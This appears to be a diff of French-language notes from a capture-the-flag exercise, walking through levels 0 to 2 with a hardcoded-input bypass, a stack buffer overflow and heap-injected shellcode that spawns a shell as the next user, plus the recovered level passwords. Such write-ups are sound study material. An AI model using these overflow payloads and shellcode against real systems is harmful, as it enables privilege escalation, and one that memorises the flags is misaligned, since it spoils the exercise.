@@ -1,87 +1,120 @@
 level0:
 	
-	cmd: "ls -la at 'home/user/level0'"
-	see 'level0' owned by level1
+	cmd:
+		ls -la at 'home/user/level0'
+
+	observations:
+		see 'level0' owned by level1
 	
-	Decompile executable '/home/user/level0/level0'
-	see condition that blocks if input is different than "423"
-	then it executes an execv command with the rights of the executable owner so 'level01'
+	strategie:
+		Decompile executable '/home/user/level0/level0'
+		see condition that blocks if input is different than "423"
+		then it executes an execv command with the rights of the executable owner so 'level01'
 	
-	cmd: "./level0 423"
-	cmd: >"cat /home/user/level1/.pass"
+	commandes:
+		"./level0 423"
+		"cat /home/user/level1/.pass"
 	
-	pass:  "1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a"
+	pass:
+		1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
+
 
 level1:
 	
 	gdb mettre breakpoint dans gets
 	
-	cmd: "(python -c "print('T'*76 + '\x44\x84\x04\x08')" ; echo 'cat /home/user/level2/.pass') | ./level1"
+	cmd:
+		"(python -c "print('T'*76 + '\x44\x84\x04\x08')" ; echo 'cat /home/user/level2/.pass') | ./level1"
 	
-	pass: "53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77"
+	pass:
+		53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 	
 	0xbffff6f0	addresse du debut de la memoire des variables locales
 	0xbffff6dc addresse de stockage de l'address de retour du get
-	
-	3221223152 - 3221223132 = 20
-	
-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 
-\xb8 \x44\x84\x04\x08
+	addresse de la fonction:
+		0x08048444
+		\x44\x84\x04\x08
 
-0x08048444
-\x44\x84\x04\x08
-0xbf ff f6 e0
-\x0e\xf6\xff\xbf
-
-00000000 <.text>:
-   0:	b8 44 84 04 08			mov    $0x8048444,%eax
-   5:	ff e0							jmp    *%eax
-
-\xb8\x44\x84\x04\x08\xff\xe0
-
-p/x *(unsigned long*)$ebp
-
-p/x *(unsigned long long*)$esp
-
-0x080491a0
+	exemple saut addresse en assembleur:
+		0:	b8 44 84 04 08			mov		$0x8048444,%eax
+		5:	ff e0					jmp		*%eax
 
 
 level2:
 
-	<p> retour vers heap (address statique) premier opcode jump vers le tableau dans la stack
-	en plus du nombre d'octets pour atteindre la premiere vrai instruction de notre fonction
+	strategie:
+		Il y a une securite nous empechant de sauter directement dans une zone memoire haute.
+		Nous allons donc sauter dans une zone memoire basse: soit la heap.
+		
+		Grace au buffer overflow nous allons remplir le tableau avec du code operationnel,
+		ainsi que modifier l'addresse de retour de la fonction <p> pour pointer vers la heap.
+		Le tableau est par la suite copie dans la heap a l'aide de strdup.
+		
+		Notez la presence du '1' dans la derniere case du tableau qui est ensuite decremente.
+		Cela permet a notre tableau d'etre termine par un '\0' sans pour autant en avoir un dans le code operationnel.
+		Permettant ainsi a strdup de copier l'integralite de notre code !
 
-	cmd: "cat /home/user/level3/.pass"
+		Aussitot que la fonction <p> ordonne le retour, notre code injecte dans la heap
+		est execute et nous avons acces au terminal en tant qu'utilisateur 'level3'.
 
-esp				= 0xbffff6c0
+	fonction en c:
+		void f()
+		{ 
+		        char cmd[3] = {'s', 'h', '\01'};
 
-suppose addr	=  0x80484f2
+				--cmd[2];
+		        system(cmd);
+		}
 
+	fonction en asm:	
+		08048474 <f>:
+		 8048474:	55                   	push   %ebp
+		 8048475:	89 e5                	mov    %esp,%ebp
+		 8048477:	83 ec 28             	sub    $0x28,%esp
+		 804847a:	c6 45 f5 73          	movb   $0x73,-0xb(%ebp)
+		 804847e:	c6 45 f6 68          	movb   $0x68,-0xa(%ebp)
+		 8048482:	c6 45 f7 01          	movb   $0x1,-0x9(%ebp)
+		 8048486:	0f b6 45 f7          	movzbl -0x9(%ebp),%eax
+		 804848a:	83 e8 01             	sub    $0x1,%eax
+		 804848d:	88 45 f7             	mov    %al,-0x9(%ebp)
+		 8048490:	8d 45 f5             	lea    -0xb(%ebp),%eax
+		 8048493:	89 04 24             	mov    %eax,(%esp)
+		 8048496:	e8 e5 fe ff ff       	call   8048380 <system@plt>
+		 804849b:	c9                   	leave  
+		 804849c:	c3                   	ret
 
-\x55\x89\xe5\x83\xec\x28\x65\xa1\x14\x00\x00\x00\x89\x45\xf4\x31\xc0\xc7\x45\xec\x2f\x62\x69\x6e\xc7\x45\xf0\x2f\x73\x68\x00\x8d\x45\xec\x89\x04\x24\xe8\xf2\xfe\xff\xff\x8b\x45\xf4\x65\x33\x05\x14\x00\x00\x00\x74\x05\xe8\xd1\xfe\xff\xff\xc9\xc3\x55\x89\xe5
+	cmd gdb [a la ligne <p+105>]:
+		p/x $eax
+		 |-> 0x804a008
+		 |
+		 `->Nous donne l'address de retour de strdup soit l'emplacement du code dans la heap ''
 
+	doutes:
+		Je dois verifier que l'addresse de la fonction 'system'
+		est bien la meme a l'execution du programme level2
 
-[HEAP ADDRESS]
-0x804a008
+	cmd gdb:
+		(gdb) info address system
+		 |-> Symbol "system" is at 0xb7e6b060 in a file compiled without debugging.
+		 |
+		 `-> J'adapte donc le code avec l'addresse memoire: '\x60\xb0\xe6\xb7'
 
-CMD [MAIN>P>HEAP]:
-python -c "print('\x55\x89\xe5\x83\xec\x28\x65\xa1\x14\x00\x00\x00\x89\x45\xf4\x31\xc0\xc7\x45\xec\x2f\x62\x69\x6e\xc7\x45\xf0\x2f\x73\x68\x00\x8d\x45\xec\x89\x04\x24\xe8\xf2\xfe\xff\xff\x8b\x45\xf4\x65\x33\x05\x14\x00\x00\x00\x74\x05\xe8\xd1\xfe\xff\xff\xc9\xc3\x55\x89\xe5' + 'A'*16 + '\x08\xa0\x04\x08')" | ./level2
+	observations:
+		L'addresse d'appel a system est change a '0xbfeb508f' a l'execution,
+		je dois trouver un moyen pour corriger cela.
 
-CMD [MAIN>P>MAIN>TAB]:
-python -c "print('\xe0\xf6\xff\xbf\x55\x89\xe5\x83\xec\x28\x65\xa1\x14\x00\x00\x00\x89\x45\xf4\x31\xc0\xc7\x45\xec\x2f\x62\x69\x6e\xc7\x45\xf0\x2f\x73\x68\x00\x8d\x45\xec\x89\x04\x24\xe8\xf2\xfe\xff\xff\x8b\x45\xf4\x65\x33\x05\x14\x00\x00\x00\x74\x05\xe8\xd1\xfe\xff\xff\xc9' + 'A'*16 + '\x4a\x85\x04\x08')" | ./level2
+	solution:
+		Le decalage de l'addresse est applique par l'instruction call pour retrouver la librairie partagee (.so shared library).
+		Je calcule donc l'offset (0xbfeb508f)3219869839 - (0xb7e6b060)3085348960 = 134520879.
+		Je l'applique ensuite a mon address de depart (0xb7e6b060)3085348960 - 134520879 = (0xafe21031)2950828081.
+		Puis j'adapte le code operationel avec l'addresse '0xafe21031' soit '\x31\x10\xe2\xaf'.
 
+	opcode [42 octets]:
+		\x55\x89\xe5\x83\xec\x28\xc6\x45\xf5\x73\xc6\x45\xf6\x68\xc6\x45\xf7\x01\x0f\xb6\x45\xf7\x83\xe8\x01\x88\x45\xf7\x8d\x45\xf5\x89\x04\x24\xe8\x31\x10\xe2\xaf\xc9\xc3\x00
 
-CODE C:
-	typedef int (*callback)();
-
-	int main()
-	{
-	        char tab[] = "\x55\x89\xe5\x83\xec\x28\x65\xa1\x14\x00\x00\x00\x89\x45\xf4\x31\xc0\xc$
-
-	        callback HEHE = (callback)&tab;
-
-	        HEHE();
-	};
-
-
+	cmd:
+		(python -c "print('\x55\x89\xe5\x83\xec\x28\xc6\x45\xf5\x73\xc6\x45\xf6\x68\xc6\x45\xf7\x01\x0f\xb6\x45\xf7\x83\xe8\x01\x88\x45\xf7\x8d\x45\xf5\x89\x04\x24\xe8\x31\x10\xe2\xaf\xc9\xc3\x00' + '\x00'*(64 - 42 + 16) + '\x08\xa0\x04\x08')" ; echo 'cat /home/user/level3/.pass') | ./level2
+	
+	pass:
+		492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
